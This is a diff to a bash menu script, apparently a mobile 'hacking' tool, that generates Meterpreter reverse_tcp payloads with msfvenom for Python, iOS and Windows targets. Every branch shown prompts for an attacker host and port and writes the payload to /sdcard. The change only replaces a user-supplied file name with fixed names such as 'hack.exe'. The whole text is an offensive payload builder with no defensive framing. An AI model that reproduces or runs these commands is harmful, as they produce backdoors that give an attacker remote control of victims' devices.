@@ -94,9 +94,7 @@ echo -e $red " Please Insert LHOST :>"
 read -p "insert LHOST :> " lhost
 echo -e $red " Please Insert LPORT :>"
 read -p "insert LPORT :> " lport
-echo -e $red " Please Insert The Name Of The Payload :>"
-read -p "insert name :> " name
-msfvenom -f raw -p python/meterpreter/reverse_tcp/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/$name.py
+msfvenom -f raw -p python/meterpreter/reverse_tcp/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/hack.py
 bash X-Hackrawi.sh
 fi
 if [ $payload = 3 ]
@@ -105,9 +103,7 @@ echo -e $red " please insert LHOST :>"/
 read -p "insert LHOST :>" lhost
 echo -e $red " please insert LPORT :>"
 read -p "insert LPORT :>" lport
-echo -e $red " please insert Name payload :>"
-read -p "insert name :>" name
-msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/$name.ios
+msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/hack.ios
 bash X-Hackrawi.sh
 fi
 if [ $payload = 4 ]
@@ -116,9 +112,7 @@ echo -e $red " please insert LHOST :>"
 read -p "insert LHOST :>" lhost
 echo -e $red " please insert LPORT :>"
 read -p "insert LPORT :>" lport
-echo -e $red " please insert Name payload :>"
-read -p "insert name :>" name
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o /sdcard/$name.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o /sdcard/hack.exe
 bash X-Hackrawi.sh
 fi
 if [ $payload = 00 ]
